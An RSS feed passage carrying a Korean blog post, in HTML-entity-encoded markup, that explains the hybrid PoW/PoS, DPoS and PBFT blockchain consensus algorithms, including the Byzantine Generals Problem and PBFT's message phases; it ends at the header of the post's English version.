&#xCC44;&#xAD74;&#xC790;&#xC640; PoS &#xAC80;&#xC99D;&#xC790;&#xC5D0;&#xAC8C; &#xBD84;&#xBC30;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Decred(DCR)&#xC5D0;&#xC11C;&#xB294; PoW &#xCC44;&#xAD74;&#xC790;&#xAC00; &#xBCF4;&#xC0C1;&#xC758; 60%, PoS &#xAC80;&#xC99D;&#xC790;&#xAC00; 30%, &#xB098;&#xBA38;&#xC9C0; 10%&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xAC1C;&#xBC1C; &#xAE30;&#xAE08;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574;&#xC11C; PoW &#xCC44;&#xAD74;&#xC790;&#xC758; &#xACFC;&#xB3C4;&#xD55C; &#xB3C5;&#xC810;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xACE0;, PoS &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB294;&#xB370; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xCC38;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC778;&#xC13C;&#xD2F0;&#xBE0C;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xD1B5;&#xD574;&#xC11C; PoW&#xC758; &#xB192;&#xC740; &#xBCF4;&#xC548;&#xC131;&#xACFC; PoS&#xC758; &#xC5D0;&#xB108;&#xC9C0; &#xD6A8;&#xC728;&#xC131;&#xC744; &#xACB0;&#xD569;&#xD558;&#xC5EC; 51% &#xACF5;&#xACA9; &#xBC29;&#xC5B4;&#xB825;&#xC744; &#xB192;&#xC774;&#xACE0; &#xAC80;&#xC99D;&#xC790;&#xC758; &#xC911;&#xC559;&#xD654; &#xBB38;&#xC81C;&#xB97C; &#xC644;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="4-DPoS-Delegated-Proof-of-Stake"><a href="#4-DPoS-Delegated-Proof-of-Stake" class="headerlink" title="4. DPoS (Delegated Proof of Stake)"></a>4. DPoS (Delegated Proof of Stake)</h1><p>DPoS(Delegated Proof of Stake)&#xB294; &#xAE30;&#xC874; PoS &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xAC1C;&#xC120;&#xD55C; &#xD615;&#xD0DC;&#xC758; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C;, &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xAC70;&#xB798; &#xAC80;&#xC99D; &#xBC0F; &#xBE14;&#xB85D; &#xC0DD;&#xC131;&#xC744; &#xBCF4;&#xB2E4; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. DPoS&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC774; &#xBE14;&#xB85D;&#xC744; &#xC9C1;&#xC811; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB300;&#xC2E0;, &#xB300;&#xD45C;&#xC790;(Delegates)&#xB97C; &#xC120;&#xCD9C;&#xD558;&#xC5EC; &#xAC80;&#xC99D; &#xBC0F; &#xBE14;&#xB85D; &#xC0DD;&#xC131; &#xAD8C;&#xD55C;&#xC744; &#xC704;&#xC784;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/09/bekim/consensus_algorithm/ko/image3.png" alt></p><p>&#xBA3C;&#xC800;, &#xBAA8;&#xB4E0; &#xD1A0;&#xD070; &#xBCF4;&#xC720;&#xC790;&#xB4E4;&#xC740; &#xC790;&#xC2E0;&#xC758; &#xC9C0;&#xBD84;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD22C;&#xD45C;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xACE0;, &#xC774; &#xD22C;&#xD45C;&#xB97C; &#xD1B5;&#xD574; &#xB300;&#xD45C;&#xC790;&#xB97C; &#xBF51;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC120;&#xCD9C;&#xB41C; &#xB300;&#xD45C;&#xC790;&#xB4E4;&#xC740; &#xC815;&#xD574;&#xC9C4; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA70; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC6B4;&#xC601;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB610;&#xD55C;, &#xC774;&#xB7F0; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xB300;&#xD45C;&#xC790;&#xC758; &#xC131;&#xC2E4;&#xD55C; &#xC6B4;&#xC601;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xD22C;&#xD45C;&#xB294; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xBA70;, &#xB9CC;&#xC57D; &#xB300;&#xD45C;&#xC790;&#xAC00; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0; &#xC54A;&#xAC70;&#xB098; &#xBD80;&#xC815;&#xD589;&#xC704;&#xB97C; &#xC800;&#xC9C0;&#xB974;&#xBA74;, &#xD1A0;&#xD070; &#xBCF4;&#xC720;&#xC790;&#xB4E4;&#xC740; &#xC7AC;&#xD22C;&#xD45C;&#xB85C; &#xB300;&#xD45C;&#xC790;&#xB97C; &#xAD50;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC774;&#xCC98;&#xB7FC; DPoS&#xB294; &#xBCF4;&#xB2E4; &#xBBFC;&#xC8FC;&#xC801;&#xC778; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC6B4;&#xC601;&#xB418;&#xACE0;, &#xB300;&#xD45C;&#xC790;&#xB4E4;&#xC774; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBE14;&#xB85D; &#xD655;&#xC815; &#xC2DC;&#xAC04;&#xC774; &#xC9E7;&#xC544;, &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC131;&#xB2A5;&#xC774; &#xB6F0;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xCC44;&#xAD74; &#xACBD;&#xC7C1;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5D0;&#xB108;&#xC9C0; &#xC18C;&#xBE44;&#xAC00; &#xB0AE;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB300;&#xD45C;&#xC790;&#xAC00; &#xC81C;&#xD55C;&#xB41C; &#xC218;&#xB85C; &#xC6B4;&#xC601;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, PoW&#xB098; PoS&#xBCF4;&#xB2E4; &#xC911;&#xC559;&#xD654;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC73C;&#xBA70;, &#xC77C;&#xBD80; &#xB300;&#xD45C;&#xC790;&#xB4E4;&#xC774; &#xB2F4;&#xD569;&#xD560; &#xACBD;&#xC6B0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xACF5;&#xC815;&#xC131;&#xC774; &#xD6FC;&#xC190;&#xB420; &#xC704;&#xD5D8;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xD45C;&#xC801;&#xC778; DPoS &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC73C;&#xB85C;&#xB294; EOS&#xC640; TRON&#xC774; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xC678;&#xC5D0;&#xB3C4; Steem&#xACFC; Lisk &#xAC19;&#xC740; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0;&#xC11C;&#xB3C4; DPoS&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xC77C;&#xC815; &#xC218;&#xC758; &#xB300;&#xD45C;&#xC790;&#xAC00; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0;, &#xD569;&#xC758; &#xACFC;&#xC815;&#xC744; &#xBE60;&#xB974;&#xAC8C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="5-PBFT-Practical-Byzantine-Fault-Tolerance"><a href="#5-PBFT-Practical-Byzantine-Fault-Tolerance" class="headerlink" title="5. PBFT (Practical Byzantine Fault Tolerance)"></a>5. PBFT (Practical Byzantine Fault Tolerance)</h1><p>&#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xAD70; &#xBB38;&#xC81C;(Byzantine General Problems)&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xB4E4;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xAC83; &#xAC19;&#xC740;&#xB370;&#xC694;.</p><p>&#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xAD70; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xACE0;&#xC548;&#xB41C; &#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xC560; &#xBB38;&#xC81C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBE44;&#xC794;&#xD2F4; &#xAD70;&#xB300;&#xC758; &#xC5EC;&#xB7EC; &#xC7A5;&#xAD70;&#xB4E4;&#xC774; &#xC801;&#xC758; &#xB3C4;&#xC2DC;&#xB97C; &#xD3EC;&#xC704;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB4E4;&#xC740; &#xC11C;&#xB85C; &#xC9C1;&#xC811; &#xB300;&#xD654;&#xD560; &#xC218; &#xC5C6;&#xACE0;, &#xBA54;&#xC2E0;&#xC800;&#xB97C; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xC18C;&#xD1B5;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xBA87;&#xBA87; &#xC7A5;&#xAD70;&#xC774; <strong>&#xBC18;&#xC5ED;&#xC790;</strong>&#xC77C; &#xC218;&#xB3C4; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xCDA9;&#xC131;&#xC2A4;&#xB7EC;&#xC6B4; &#xC7A5;&#xAD70;&#xB4E4;&#xC740; &#xD568;&#xAED8; &#xACF5;&#xACA9;&#xD558;&#xAC70;&#xB098; &#xD6C4;&#xD1F4;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xBC18;&#xC5ED;&#xC790;&#xB4E4;&#xC740; &#xD63C;&#xB780;&#xC744; &#xC77C;&#xC73C;&#xCF1C; &#xC77C;&#xBD80;&#xB294; &#xACF5;&#xACA9;&#xD558;&#xACE0;, &#xC77C;&#xBD80;&#xB294; &#xD6C4;&#xD1F4;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC791;&#xC804;&#xC744; &#xB9DD;&#xCE58;&#xB824; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB7EC;&#xD55C; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xCDA9;&#xC131;&#xC2A4;&#xB7EC;&#xC6B4; &#xC7A5;&#xAD70;&#xB4E4;&#xC740; &#xB450; &#xAC00;&#xC9C0; &#xBAA9;&#xD45C;&#xB97C; &#xB2EC;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xBAA8;&#xB4E0; &#xCDA9;&#xC131;&#xC2A4;&#xB7EC;&#xC6B4; &#xC7A5;&#xAD70;&#xB4E4;&#xC774; &#xAC19;&#xC740; &#xACB0;&#xC815;&#xC744; &#xB0B4;&#xB824;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xACF5;&#xACA9;&#xD560; &#xAC70;&#xBA74; &#xBAA8;&#xB450; &#xACF5;&#xACA9;&#xD558;&#xACE0;, &#xD6C4;&#xD1F4;&#xD560; &#xAC70;&#xBA74; &#xBAA8;&#xB450; &#xD6C4;&#xD1F4;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC18C;&#xC218;&#xC758; &#xBC18;&#xC5ED;&#xC790;&#xB4E4;&#xC774; &#xC798;&#xBABB;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xD37C;&#xB728;&#xB824; &#xC5C9;&#xB6B1;&#xD55C; &#xACB0;&#xC815;&#xC744; &#xB0B4;&#xB9AC;&#xAC8C; &#xD574;&#xC11C;&#xB294; &#xC548; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xCDA9;&#xC131;&#xC2A4;&#xB7EC;&#xC6B4; &#xC7A5;&#xAD70;&#xB4E4;&#xC740; &#xC5B4;&#xB5A4; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xC774; &#xB450; &#xAC00;&#xC9C0; &#xC870;&#xAC74;&#xC744; &#xC9C0;&#xCF1C;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xBC18;&#xC5ED;&#xC790;&#xB4E4;&#xC740; &#xAC70;&#xC9D3; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xB0B4;&#xAC70;&#xB098;, &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC870;&#xC791;&#xD558;&#xB294; &#xB4F1; &#xBB34;&#xC5C7;&#xC774;&#xB4E0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xB530;&#xB77C;&#xC11C;, &#xC7A5;&#xAD70;&#xB4E4;&#xC774; &#xC5B4;&#xB5A4; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB3C4; &#xC62C;&#xBC14;&#xB978; &#xD569;&#xC758;&#xB97C; &#xC774;&#xB04C;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xB294; &#xC548;&#xC815;&#xC801;&#xC778; &#xC18C;&#xD1B5; &#xBC29;&#xC2DD;(&#xC54C;&#xACE0;&#xB9AC;&#xC998;) &#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xAC00; &#xBC14;&#xB85C; &#x201C;&#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xAD70; &#xBB38;&#xC81C;(Byzantine Generals Problem)&#x201D;&#xC785;&#xB2C8;&#xB2E4;. </li></ul><p>PBFT(Practical Byzantine Fault Tolerance)&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C;  &#xC77C;&#xBD80; &#xB178;&#xB4DC;&#xAC00; &#xC751;&#xB2F5;&#xD558;&#xC9C0; &#xC54A;&#xAC70;&#xB098; &#xC798;&#xBABB;&#xB41C; &#xC815;&#xBCF4;&#xB85C; &#xC751;&#xB2F5;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xD569;&#xC758;&#xB97C; &#xC774;&#xB8E8;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, 3f+1 &#xAC1C;&#xC758; &#xB178;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD560; &#xB54C; f&#xAC1C;&#xC758; &#xC545;&#xC758;&#xC801;&#xC778;(&#xBE44;&#xC794;&#xD2F4;) &#xB178;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xB3C4; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xAE30;&#xC874;&#xC758; PoW&#xB098; PoS&#xC640; &#xB2EC;&#xB9AC; &#xC5F0;&#xC0B0; &#xACBD;&#xC7C1;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xD22C;&#xD45C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xC758;&#xB97C; &#xC218;&#xD589;&#xD574; &#xBE60;&#xB978; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; Finality&#xB97C; &#xBCF4;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/09/bekim/consensus_algorithm/ko/image4.png" alt></p><blockquote><p>Figure 1. Byzantine Generals Problem Image [&#xCD9C;&#xCC98;: &#xB17C;&#xBB38; &#xCCA8;&#xBD80;]</p></blockquote><p>PBFT&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(Client)&#xC640; &#xBCF5;&#xC81C;&#xBCF8;(Replicas) &#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70;, &#xBCF5;&#xC81C;&#xBCF8; &#xC911; &#xD558;&#xB098;&#xAC00; &#xB9AC;&#xB354;(Primary) &#xB178;&#xB4DC; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; 4&#xB2E8;&#xACC4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;(Request, Pre-prepare, Prepare, Commit)&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. (f: &#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xC560; &#xAC00;&#xB2A5; &#xB178;&#xB4DC; &#xC218;)</p><ol><li><p><strong>Request</strong><br>Client&#xAC00; &#xB9AC;&#xB354; &#xB178;&#xB4DC;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Pre-Prepare</strong><br>&#xB9AC;&#xB354; &#xB178;&#xB4DC;&#xB294; &#xBAA8;&#xB4E0; &#xBCF4;&#xC870;(&#xBC31;&#xC5C5;) &#xB178;&#xB4DC;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xD569;&#xB2C8;&#xB2E4;.&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB9AC;&#xB354; &#xB178;&#xB4DC;&#xAC00; &#xC545;&#xC758;&#xC801;&#xC774;&#xB77C;&#xBA74; &#xC798;&#xBABB;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xD30C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;,&#xC774;&#xD6C4;&#xC758; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Prepare</strong><br>&#xAC01; &#xBCF4;&#xC870; &#xB178;&#xB4DC;&#xB294; &#xB9AC;&#xB354; &#xB178;&#xB4DC;&#xAC00; &#xBCF4;&#xB0B8; Pre-Prepare &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xAC80;&#xC99D;&#xD55C; &#xB4A4;, &#xB2E4;&#xB978; &#xB178;&#xB4DC;&#xB4E4;&#xC5D0;&#xAC8C; PREPARE &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;, &#xB178;&#xB4DC;&#xB4E4;&#xC740; &#xB3D9;&#xC77C;&#xD55C; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD574; &#xCD5C;&#xC18C; 2f+1&#xAC1C;&#xC758; PREPARE &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBC1B;&#xC73C;&#xBA74; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Commit</strong><br>&#xAC01; &#xBCF4;&#xC870; &#xB178;&#xB4DC;&#xB294;  2f+1&#xAC1C;&#xC758; PREPARE &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBC1B;&#xC73C;&#xBA74; &#xC694;&#xCCAD;&#xC744; &#xC2E0;&#xB8B0;&#xD558;&#xACE0;, &#xB2E4;&#xB978; &#xB178;&#xB4DC;&#xB4E4;&#xC5D0;&#xAC8C; COMMIT &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xB178;&#xB4DC;&#xB4E4;&#xC740; &#xB3D9;&#xC77C;&#xD55C; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD574; 2f+1 &#xAC1C;&#xC758; COMMIT &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBC1B;&#xC73C;&#xBA74; &#xC694;&#xCCAD;&#xC744; &#xD655;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Reply</strong><br>Client&#xAC00; f+1&#xAC1C;&#xC758; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xC751;&#xB2F5;&#xC744; &#xBC1B;&#xC73C;&#xBA74;, &#xD574;&#xB2F9; &#xC694;&#xCCAD;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol><p>PBFT&#xB294; &#xBE60;&#xB978; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xD655;&#xC815;&#xACFC; &#xB192;&#xC740; &#xBCF4;&#xC548;&#xC131;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774;&#xC5D0;&#xC694;. PoW&#xB098; PoS&#xC640; &#xB2EC;&#xB9AC; &#xC5F0;&#xC0B0; &#xACBD;&#xC7C1;&#xC774; &#xC5C6;&#xACE0;, 1/3 &#xC774;&#xD558;&#xC758; &#xBE44;&#xC794;&#xD2F4; &#xC7A5;&#xC560;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC6B4;&#xC601;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xAC00; &#xCEE4;&#xC9C8;&#xC218;&#xB85D; &#xD569;&#xC758; &#xACFC;&#xC815;&#xC774; &#xB290;&#xB824;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD655;&#xC7A5;&#xC131;&#xC774; &#xC81C;&#xD55C;&#xB418;&#xB294; &#xB2E8;&#xC810;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>PBFT&#xB294; Hyperledger Fabric, Zilliqa &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xD504;&#xB77C;&#xC774;&#xBE57; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC774;&#xB098; &#xC18C;&#xADDC;&#xBAA8; &#xB178;&#xB4DC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC801;&#xD569;&#xD55C; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C; &#xD3C9;&#xAC00;&#xBC1B;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; 5&#xAC00;&#xC9C0; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC5B4;&#xC694;! &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xB3C4; &#xC788;&#xACE0;, &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xB3C4; &#xC788;&#xB294;&#xB370;, &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xACF5;&#xBD80;&#xB97C; &#xD558;&#xBA74;&#xC11C; &#xAC00;&#xC7A5; &#xC775;&#xC219;&#xD55C; &#xAC74; &#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xACFC; &#xC9C0;&#xBD84; &#xC99D;&#xBA85;&#xC774;&#xC5C8;&#xB358;&#xC9C0;&#xB77C; &#xB0B4;&#xC6A9;&#xC774; &#xC870;&#xAE08; &#xB9CE;&#xB124;&#xC694;. &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xB9CE;&#xC740; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC788;&#xB294;&#xB370;, &#xC624;&#xB298;&#xC740; &#xC798; &#xC54C;&#xB824;&#xC9C4; 5&#xAC00;&#xC9C0;&#xB9CC; &#xB2E4;&#xB904;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD558;&#xACE0; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB0B4;&#xC6A9;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xB610; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#x1F44B;</p><ul><li><strong>Reference</strong><br><a href="https://github.com/bitcoin/bitcoin">https://github.com/bitcoin/bitcoin</a><br><a href="https://github.com/ethereum/go-ethereum">https://github.com/ethereum/go-ethereum</a><br><a href="https://blockapps.net/blog/staking-in-crypto-exploring-adoption-trends-and-strategies-for-2024/">https://blockapps.net/blog/staking-in-crypto-exploring-adoption-trends-and-strategies-for-2024/</a><br><a href="https://coinbureau.com/review/decred-dcr/">https://coinbureau.com/review/decred-dcr/</a><br><a href="https://pmg.csail.mit.edu/papers/osdi99.pdf">https://pmg.csail.mit.edu/papers/osdi99.pdf</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/bitcoin/">bitcoin</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoW/">PoW</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoS/">PoS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Five Consensus Algorithms in Blockchain [en]</title>
      <link>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/en/</link>
      <guid>https://hackyboiz.github.io/2025/03/09/bekim/consensus_algorithm/en/</guid>
      <pubDate>Sun, 09 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
